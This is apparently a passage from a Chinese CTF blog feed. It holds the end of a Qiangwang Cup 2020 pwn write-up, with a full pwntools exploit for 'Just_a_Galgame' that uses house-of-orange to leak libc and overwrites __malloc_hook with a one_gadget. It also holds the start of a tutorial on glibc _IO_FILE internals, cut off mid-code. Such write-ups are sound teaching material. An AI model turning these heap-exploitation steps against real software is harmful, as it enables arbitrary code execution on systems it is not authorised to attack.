punctuation">}</span></code></pre><p>分析完题目，我们发现程序并没有提供free功能，那么就需要利用house-of-orange，利用功能二的堆溢出修改topchunk的size，然后申请0x1000的chunk将topchunk放入unsortedbin，然后再通过功能一从unsortedbin中切割chunk，接着show一下，得到libc地址</p><p>topchunk的大小需要满足</p><pre><code>size&amp;0xfff</code></pre><p>我们申请了一个0x68的chunk后topchunk还剩下0x20d41，0x20d41&amp;0xfff=0xd41</p><p>有了libc地址该如何利用？</p><p>注意到edit功能并未对index检测越界，而leave功能读入的位置在管理chunk的数组下方</p><pre class=" language-assembly"><code class="language-assembly">.bss:0000000000404060 ; __int64 qword_404060[7].bss:0000000000404060 qword_404060    dq ?     ...................................bss:00000000004040A0 unk_4040A0      db    ? ;               ; DATA XREF: main+270↑o.bss:00000000004040A0                             </code></pre><p>所以我们往0x4040a0处写入malloc_hook-0x60(因为edit是往chunk+0x60处写入的，我们要往malloc_hook写入onegadget就需要将chunk的指针设置为malloc_hook-0x60)，然后根据偏移得到0x4040a0的index为8，利用edit往malloc_hook写onegadget即可，exp如下</p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./Just_a_Galgame'</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'Just_a_Galgame'</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'libc.so.6'</span><span class="token punctuation">)</span>onegadget <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0x4f365</span><span class="token punctuation">,</span> <span class="token number">0x4f3c2</span><span class="token punctuation">,</span> <span class="token number">0x10a45c</span><span class="token punctuation">]</span><span class="token keyword">def</span> <span class="token function">add_0x68</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'>> '</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'>> '</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'2'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'idx >> '</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'movie name >> '</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">add_0x1000</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'>> '</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'3'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'>> '</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'4'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">leave</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'>> '</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'5'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'QAQ\n'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>content<span class="token punctuation">)</span>add_0x68<span class="token punctuation">(</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">8</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0xd41</span><span class="token punctuation">)</span><span class="token punctuation">)</span>add_0x1000<span class="token punctuation">(</span><span class="token punctuation">)</span>add_0x68<span class="token punctuation">(</span><span class="token punctuation">)</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span>libc_base <span class="token operator">=</span> u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">0x3ec2a0</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'libc_base => {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>malloc_hook<span class="token operator">=</span>libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'__malloc_hook'</span><span class="token punctuation">]</span>one_gadget<span class="token operator">=</span>libc_base<span class="token operator">+</span>onegadget<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'malloc_hook => {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>malloc_hook<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'one_gadget => {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>one_gadget<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>leave<span class="token punctuation">(</span>p64<span class="token punctuation">(</span>malloc_hook<span class="token number">-0x60</span><span class="token punctuation">)</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>one_gadget<span class="token punctuation">)</span><span class="token punctuation">)</span>add_0x68<span class="token punctuation">(</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;强网杯2020的pwn题多且质量高，非常有必要复现一部分&lt;/p&gt;
&lt;h3 id=&quot;0x1-easypwn&quot;&gt;&lt;a href=&quot;#0x1-easypwn&quot; class=&quot;headerlink&quot; title=&quot;0x1.easypwn&quot;&gt;&lt;/a&gt;0x1.easypwn&lt;/h3&gt;&lt;pre&gt;&lt;code class=&quot;c&quot;&gt;unsigned __int64 sub_ACE()
{
  unsigned __int64 v1; // [rsp+8h] [rbp-8h]

  v1 = __readfsqword(0x28u);
  setvbuf(stdin, 0LL, 2, 0LL);
  setvbuf(stdout, 0LL, 2, 0LL);
  setvbuf(stderr, 0LL, 2, 0LL);
  if ( !mallopt(1, 0) )
    exit(-1);
  return __readfsqword(0x28u) ^ v1;
}&lt;/code&gt;&lt;/pre&gt;
    
    </summary>
    
    
      <category term="CTF" scheme="https://lawliet.ren/categories/CTF/"/>
    
    
      <category term="PWN" scheme="https://lawliet.ren/tags/PWN/"/>
    
      <category term="强网杯2020" scheme="https://lawliet.ren/tags/%E5%BC%BA%E7%BD%91%E6%9D%AF2020/"/>
    
  </entry>
  
  <entry>
    <title>IO_FILE学习</title>
    <link href="https://lawliet.ren/2020/08/08/io-file-xue-xi/"/>
    <id>https://lawliet.ren/2020/08/08/io-file-xue-xi/</id>
    <published>2020-08-08T05:22:16.000Z</published>
    <updated>2020-09-03T08:02:40.839Z</updated>
    
    <content type="html"><![CDATA[<p>本文用于记录IO_FILE的利用原理思路以及构造模板</p><a id="more"></a><p>首先我们知道内核启动的时候默认打开3个I/O设备文件，标准输入文件<code>stdin</code>，标准输出文件<code>stdout</code>，标准错误输出文件<code>stderr</code>，分别得到文件描述符 0, 1, 2，而这三个I/O文件的类型为指向FILE的指针，而FILE实际上就是<code>_IO_FILE</code></p><pre class=" language-c"><code class="language-c"><span class="token keyword">typedef</span> <span class="token keyword">struct</span> _IO_FILE FILE<span class="token punctuation">;</span><span class="token keyword">extern</span> <span class="token keyword">struct</span> _IO_FILE <span class="token operator">*</span><span class="token constant">stdin</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">/* Standard input stream.  */</span><span class="token keyword">extern</span> <span class="token keyword">struct</span> _IO_FILE <span class="token operator">*</span><span class="token constant">stdout</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">/* Standard output stream.  */</span><span class="token keyword">extern</span> <span class="token keyword">struct</span> _IO_FILE <span class="token operator">*</span><span class="token constant">stderr</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">/* Standard error output stream.  */</span></code></pre><pre class=" language-c"><code class="language-c">_IO_FILE <span class="token operator">*</span><span class="token constant">stdin</span> <span class="token operator">=</span> <span class="token punctuation">(</span>FILE <span class="token operator">*</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span>_IO_2_1_stdin_<span class="token punctuation">;</span>_IO_FILE <span class="token operator">*</span><span class="token constant">stdout</span> <span class="token operator">=</span> <span class="token punctuation">(</span>FILE <span class="token operator">*</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span>_IO_2_1_stdout_<span class="token punctuation">;</span>_IO_FILE <span class="token operator">*</span><span class="token constant">stderr</span> <span class="token operator">=</span> <span class="token punctuation">(</span>FILE <span class="token operator">*</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span>_IO_2_1_stderr_<span class="token punctuation">;</span></code></pre><p>_IO_FILE结构体定义如下</p><pre class=" language-c"><code class="language-c"><span class="token keyword">struct</span> _IO_FILE <span class="token punctuation">{</span>  <span class="token keyword">int</span> _flags<span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">/* High-order word is _IO_MAGIC; rest is flags. */</span><span class="token macro property">#<span class="token directive keyword">define</span> _IO_file_flags _flags</span>  <span class="token comment" spellcheck="true">/* The following pointers correspond to the C++ streambuf protocol. */</span>  <span class="token comment" spellcheck="true">/* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */</span>  <span class="token keyword">char</span><span class="token operator">*</span> _IO_read_ptr<span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">/* Current read pointer */</span>  <span class="token keyword">char</span><span class="token operator">*</span> _IO_read_end<span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">/* End of get area. */</span>  <span class="token keyword">char</span><span class="token operator">*</span> _IO_read_base<span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">/* Start of putback+get area. */</span>  <span class="token keyword">char</span><span class="token operator">*</span> _IO_write_base<span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">/* Start of put area. */</span>  <span class="token keyword">char</span><span class="token operator">*</span> _IO_write_ptr<span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">/* Current put pointer. */</span>  <span class="token keyword">char</span><span class="token operator">*</span> _IO_write_end<span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">/* End of put area. */</span>  <span class="token keyword">char</span><span class="token operator">*</span> _IO_buf_base<span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">/* Start of reserve area. */</span>  <span class="token keyword">char</span><span class="token operator">*</span> _IO_buf_end<span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">/* End of reserve area. */</span>  <span class="token comment" spellcheck="true">/* The following fields are used to support backing up and undo. */</span>  <span class="token keyword">char</span> <span class="token operator">*</span>_IO_save_base<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">/* Pointer to start of non-current get area. */</span>  <span class="token keyword">char</span> <span class="token operator">*</span>_IO_backup_base<span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">/* Pointer to first valid character of backup area */</span>  <span class="token keyword">char</span> <span class="token operator">*</span>_IO_save_end<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">/* Pointer to end of non-current get area. */</span>  <span class="token keyword">struct</span> _IO_marker <span class="token operator">*</span>_markers<span class="token punctuation">;</span>  <span class="token keyword">struct</span> _IO_FILE <span class="token operator">*</span>_chain<span class="token punctuation">;</span>  <span class="token keyword">int</span> _fileno<span class="token punctuation">;</span><span class="token macro property">#<span class="token directive keyword">if</span> 0</span>  <span class="token keyword">int</span> _blksize<span class="token punctuation">;</span><span class="token macro property">#<span class="token directive keyword">else</span></span>  <span class="token keyword">int</span> _flags2<span class="token punctuation">;</span><span class="token macro property">#<span class="token directive keyword">endif</span></span>  _IO_off_t _old_offset<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">/* This used to be _offset but it's too small.  */</span><span class="token macro property">#<span class="token directive keyword">define</span> __HAVE_COLUMN </span><span class="token comment" spellcheck="true">/* temporary */</span>  <span class="token comment" spellcheck="true">/* 1+column number of pbase(); 0 is unknown. */</span>  <span class="token keyword">unsigned</span> <span class="token keyword">short</span> _cur_column<span class="token punctuation">;</span>  <span class="token keyword">signed</span> <span class="token keyword">char</span> _vtable_offset<span class="token punctuation">;</span>  <span class="token keyword">char</span> _shortbuf<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">/*  char* _save_gptr;  char* _save_egptr; */</span>  _IO_lock_t <span class="token operator">*</span>_lock<span class="token punctuation">;</span><span class="token macro property">#<span class="token directive keyword">ifdef</span> _IO_USE_OLD_IO_FILE</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token macro property">#<span class="token directive keyword">define</span> _IO_MAGIC 0xFBAD0000 </span><span class="token comment" spellcheck="true">/* Magic number */</span><span class="token macro property">#<span class="token directive keyword">define</span> _OLD_STDIO_MAGIC 0xFABC0000 </span><span class="token comment" spellcheck="true">/* Emulate old stdio. */</span><span class="token macro property">#<span class="token directive keyword">define</span> _IO_MAGIC_MASK 0xFFFF0000</span><span class="token macro property">#<span class="token directive keyword">define</span> _IO_USER_BUF 1 </span><span class="token comment" spellcheck="true">/* User owns buffer; don't delete it on close. */</span><span class="token macro property">#<span class="token directive keyword">define</span> _IO_UNBUFFERED 2</span><span class="token macro property">#<span class="token directive keyword">define</span> _IO_NO_READS 4 </span><span class="token comment" spellcheck="true">/* Reading not allowed */</span><span class="token macro property">#<span class="token directive keyword">define</span> _IO_NO_WRITES 8 </span><span class="token comment" spellcheck="true">/* Writing not allowd */</span><span class="token macro property">#<span class="token directive keyword">define</span> _IO_EOF_SEEN 0x10</span><span class="token macro property">#<span class="token directive keyword">define</span> _IO_ERR_SEEN 0x20</span><span class="token macro property">#<span class="token directive keyword">define</span> _IO_DELETE_DONT_CLOSE 0x40 </span><span class="token comment" spellcheck="true">/* Don't call close(_fileno) on cleanup. */</span><span class="token macro property">#<span class="token directive keyword">define</span> _IO_LINKED 0x80 </span><span class="token comment" spellcheck="true">/* Set if linked (using _chain) to streambuf::_list_all.*/</span><span class="token macro property">#<span class="token directive keyword">define</span> _IO_IN_BACKUP 0x100</span><span class="token macro property">#<span class="token directive keyword">define</span> _IO_LINE_BUF 0x200</span><span class="token macro property">#<span class="token directive keyword">define</span> _IO_TIED_PUT_GET 0x400 </span><span class="token comment" spellcheck="true">/* Set if put and get pointer logicly tied. */</span><span class="token macro property">#<span class="token directive keyword">define</span> _IO_CURRENTLY_PUTTING 0x800</span><span class="token macro property">#<span class="token directive keyword">define</span> _IO_IS_APPENDING 0x1000</span><span class="token macro property">#<span class="token directive keyword">define</span> _IO_IS_FILEBUF 0x2000</span><span class="token macro property">#<span class="token directive keyword">define</span> _IO_BAD_SEEN 0x4000</span><span class="token macro property">#<span class="token directive keyword">define</span> _IO_USER_LOCK 0x8000</span></code></pre><p>其中<code>_IO_2_1_stdin_</code>，<code>_IO_2_1_stdout_</code>，<code>_IO_2_1_stderr_</code>定义如下</p><pre class=" language-c"><code class="language-c"><span class="token keyword">extern</span> <span class="token keyword">struct</span> _IO_FILE_plus _IO_2_1_stdin_<span class="token punctuation">;</span><span class="token keyword">extern</span> <span class="token keyword">struct</span> _IO_FILE_plus _IO_2_1_stdout_<span class="token punctuation">;</span><span class="token keyword">extern</span> <span class="token keyword">struct</span> _IO_FILE_plus _IO_2_1_stderr_<span class="token punctuation">;</span></code></pre><p><code>_IO_2_1_stdin_</code>，<code>_IO_2_1_stdout_</code>，<code>_IO_2_1_stderr_</code>都是<code>_IO_FILE_plus</code>结构体指针，除了这三个以外，还有一个<code>_IO_list_all</code>也是<code>_IO_FILE_plus</code>结构体指针，用来管理所有的<code>_IO_FILE</code></p><pre class=" language-c"><code class="language-c"><span class="token keyword">extern</span> <span class="token keyword">struct</span> _IO_FILE_plus <span class="token operator">*</span>_IO_list_all<span class="token punctuation">;</span></code></pre><p>我们再看看<code>_IO_FILE_plus</code>结构体的定义</p><pre class=" language-c"><code class="language-c"><span class="token keyword">struct</span> _IO_FILE_plus<span class="token punctuation">{</span>  _IO_FILE file<span class="token punctuation">;</span>  <span class="token keyword">const</span> <span class="token keyword">struct</span> _IO_jump_t <span class="token operator">*</span>vtable<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">;</span></code></pre><p><code>_IO_FILE_plus</code>包含一个<code>_IO_FILE</code>结构体和一个_<code>IO_jump_t</code>结构体类型的指针，记作<code>vtable</code>，我们再看到<code>IO_jump_t</code>结构体定义</p><pre class=" language-c"><code class="language-c"><span class="token keyword">struct</span> _IO_jump_t<span class="token punctuation">{</span>    <span class="token function">JUMP_FIELD</span><span class="token punctuation">(</span>size_t<span class="token punctuation">,</span> __dummy<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">JUMP_FIELD</span><span class="token punctuation">(</span>size_t<span class="token punctuation">,</span> __dummy2<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">JUMP_FIELD</span><span class="token punctuation">(</span>_IO_finish_t<span class="token punctuation">,</span> __finish<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">JUMP_FIELD</span><span class="token punctuation">(</span>_IO_overflow_t<span class="token punctuation">,</span> __overflow<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">JUMP_FIELD</span><span class="token punctuation">(</span>_IO_underflow_t<span class="token punctuation">,</span> __underflow<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">JUMP_FIELD</span><span class="token punctuation">(</span>_IO_underflow_t<span class="token punctuation">,</span> __uflow<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">JUMP_FIELD</span><span class="token punctuation">(</span>_IO_pbackfail_t<span class="token punctuation">,</span> __pbackfail<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">/* showmany */</span>    <span class="token function">JUMP_FIELD</span><span class="token punctuation">(</span>_IO_xsputn_t<span class="token punctuation">,</span> __xsputn<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">JUMP_FIELD</span><span class="token punctuation">(</span>_IO_xsgetn_t<span class="token punctuation">,</span> __xsgetn<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">JUMP_FIELD</span><span class="token punctuation">(</span>_IO_seekoff_t<span class="token punctuation">,</span> __seekoff<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">JUMP_FIELD</span><span class="token punctuation">(</span>_IO_seekpos_t<span class="token punctuation">,</span> __seekpos<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">JUMP_FIELD</span><span class="token punctuation">(</span>_IO_setbuf_t<span class="token punctuation">,</span> __setbuf<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">JUMP_FIELD</span><span class="token punctuation">(</span>_IO_sync_t<span class="token punctuation">,</span> __sync<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">JUMP_FIELD</span><span class="token punctuation">(</span>_IO_doallocate_t<span class="token punctuation">,</span> __doallocate<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">JUMP_FIELD</span><span class="token punctuation">(</span>_IO_read_t<span class="token punctuation">,</span> __read<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">JUMP_FIELD</span><span class="token punctuation">(</span>_IO_write_t<span class="token punctuation">,</span> __write<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">JUMP_FIELD</span><span class="token punctuation">(</span>_IO_seek_t<span class="token punctuation">,</span> __seek<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">JUMP_FIELD</span><span class="token punctuation">(</span>_IO_close_t<span class="token punctuation">,</span> __close<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">JUMP_FIELD</span><span class="token punctuation">(</span>_IO_stat_t<span class="token punctuation">,</span> __stat<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">JUMP_FIELD</span><span class="token punctuation">(</span>_IO_showmanyc_t<span class="token punctuation">,</span> __showmanyc<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">JUMP_FIELD</span><span class="token punctuation">(</span>_IO_imbue_t<span class="token punctuation">,</span> __imbue<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token macro property">#<span class="token directive keyword">if</span> 0</span>    get_column<span class="token punctuation">;</span>    set_column<span class="token punctuation">;</span><span class="token macro property">#<span class="token directive keyword">endif</span></span><span class="token punctuation">}</span><span class="token punctuation">;</span></code></pre><p>于是整个<code>_IO_FILE_plus</code>结构体的示意图如下</p><p><img src="http://img2.tan90.me/IO_FILE_3df9ac2c8dabbdc5ca11a5d505598c2c.png" alt="IO_FILE"></p><p>而<code>_IO_2_1_stdin_</code>，<code>_IO_2_1_stdout_</code>，<code>_IO_2_1_stderr_</code>和<code>_IO_list_all</code>都是通过<code>_IO_FILE</code>结构体中的<code>_chain</code>指针相连的，而<code>_chain</code>指针也是一个_IO_FILE结构体指针</p><pre class=" language-c"><code class="language-c"><span class="token keyword">struct</span> _IO_FILE <span class="token operator">*</span>_chain<span class="token punctuation">;</span></code></pre><p>它们的连接顺序如下</p><p><img src="/LawlietLW.github.io/2020/08/08/io-file-xue-xi/1.png" alt></p><p>glibc中有一个函数<code>_IO_flush_all_lockp</code>，该函数的功能是刷新所有FILE结构体的输出缓冲区</p><pre class=" language-c"><code class="language-c"><span class="token keyword">int</span><span class="token function">_IO_flush_all_lockp</span> <span class="token punctuation">(</span><span class="token keyword">int</span> do_lock<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">int</span> result <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token keyword">struct</span> _IO_FILE <span class="token operator">*</span>fp<span class="token punctuation">;</span>  <span class="token keyword">int</span> last_stamp<span class="token punctuation">;</span><span class="token macro property">#<span class="token directive keyword">ifdef</span> _IO_MTSAFE_IO</span>  <span class="token function">__libc_cleanup_region_start</span> <span class="token punctuation">(</span>do_lock<span class="token punctuation">,</span> flush_cleanup<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>do_lock<span class="token punctuation">)</span>    <span class="token function">_IO_lock_lock</span> <span class="token punctuation">(</span>list_all_lock<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token macro property">#<span class="token directive keyword">endif</span></span>  last_stamp <span class="token operator">=</span> _IO_list_all_stamp<span class="token punctuation">;</span>  fp <span class="token operator">=</span> <span class="token punctuation">(</span>_IO_FILE <span class="token operator">*</span><span class="token punctuation">)</span> _IO_list_all<span class="token punctuation">;</span>  <span class="token keyword">while</span> <span class="token punctuation">(</span>fp <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>      run_fp <span class="token operator">=</span> fp<span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>do_lock<span class="token punctuation">)</span>    <span class="token function">_IO_flockfile</span> <span class="token punctuation">(</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>fp<span class="token operator">-></span>_mode <span class="token operator">&lt;=</span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> fp<span class="token operator">-></span>_IO_write_ptr <span class="token operator">></span> fp<span class="token operator">-></span>_IO_write_base<span class="token punctuation">)</span><span class="token macro property">#<span class="token directive keyword">if</span> defined _LIBC || defined _GLIBCPP_USE_WCHAR_T</span>       <span class="token operator">||</span> <span class="token punctuation">(</span><span class="token function">_IO_vtable_offset</span> <span class="token punctuation">(</span>fp<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span>           <span class="token operator">&amp;&amp;</span> fp<span class="token operator">-></span>_mode <span class="token operator">></span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>fp<span class="token operator">-></span>_wide_data<span class="token operator">-></span>_IO_write_ptr                    <span class="token operator">></span> fp<span class="token operator">-></span>_wide_data<span class="token operator">-></span>_IO_write_base<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token macro property">#<span class="token directive keyword">endif</span></span>       <span class="token punctuation">)</span>      <span class="token operator">&amp;&amp;</span> <span class="token function">_IO_OVERFLOW</span> <span class="token punctuation">(</span>fp<span class="token punctuation">,</span> <span class="token constant">EOF</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token constant">EOF</span><span class="token punctuation">)</span>    result <span class="token operator">=</span> <span class="token constant">EOF</span><span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>do_lock<span class="token punctuation">)</span>    <span class="token function">_IO_funlockfile</span> <span class="token punctuation">(</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span>      run_fp <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>last_stamp <span class="token operator">!=</span> _IO_list_all_stamp<span class="token punctuation">)</span>    <span class="token punctuation">{</span>      <span class="token comment" spellcheck="true">/* Something was added to the list.  Start all over again.  */</span>      fp <span class="token operator">=</span> <span class="token punctuation">(</span>_IO_FILE <span class="token operator">*</span><span class="token punctuation">)</span> _IO_list_all<span class="token punctuation">;</span>      last_stamp <span class="token operator">=</span> _IO_list_all_stamp<span class="token punctuation">;</span>    <span class="token punctuation">}</span>      <span class="token keyword">else</span>    fp <span class="token operator">=</span> fp<span class="token operator">-></span>_chain<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token macro property">#<span class="token directive keyword">ifdef</span> _IO_MTSAFE_IO</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>do_lock<span class="token punctuation">)</span>    <span class="token function">_IO_lock_unlock</span> <span class="token punctuation">(</span>list_all_lock<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">__libc_cleanup_region_end</span> <span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token macro property">#<span class="token directive keyword">endif</span></span>  <span class="token keyword">return</span> result<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>根据大佬的分析，以下三种操作会触发<code>_IO_flush_all_lockp</code></p><pre><code>libc执行abort函数时。程序执行exit函数时。程序从main函数返回时。</code></pre><p>我这里只分析第一种，<code>libc执行abort函数时</code>，我们知道，当malloc出错时会执行<code>malloc_printerr</code>函数，源码如下</p><pre class=" language-c"><code class="language-c"><span class="token function">malloc_printerr</span> <span class="token punctuation">(</span><span class="token keyword">int</span> action<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>str<span class="token punctuation">,</span> <span class="token keyword">void</span> <span class="token operator">*</span>ptr<span class="token punctuation">,</span> mstate ar_ptr<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token comment" spellcheck="true">/* Avoid using this arena in future.  We do not attempt to synchronize this     with anything else because we minimally want to ensure that __libc_message     gets its resources safely without stumbling on the current corruption.  */</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>ar_ptr<span class="token punctuation">)</span>    <span class="token function">set_arena_corrupt</span> <span class="token punctuation">(</span>ar_ptr<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>action <span class="token operator">&amp;</span> <span class="token number">5</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">5</span><span class="token punctuation">)</span>    <span class="token 